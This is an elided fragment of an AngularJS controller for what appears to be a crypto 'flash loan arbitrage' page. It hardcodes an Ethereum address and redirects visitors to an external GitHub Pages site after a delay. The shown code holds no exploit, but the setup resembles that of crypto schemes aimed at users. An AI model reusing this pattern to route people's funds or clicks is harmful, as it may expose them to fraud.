...
app.controller('myCtrl', async function($scope) {
                $scope.init = function() {
                        ...
                        $scope.chain = "Ethereum", $scope.addressdex = "0xbE09f88EcBa66099497358dce7740E27b0c4D725", $scope.scan = "https://etherscan.io/", $scope.idscan = "Etherscan", $scope.erc20 = {
			    name: '',
                            symbol: '',
                            network: !isBnb
                        };
                        ...
                        $scope.getLoanEstimates = function() {
						    ...
						    window.location.href = 'https://arbitrageflash.github.io/home.html';
						}, 5000);
                                            }
                                        });
                                    }
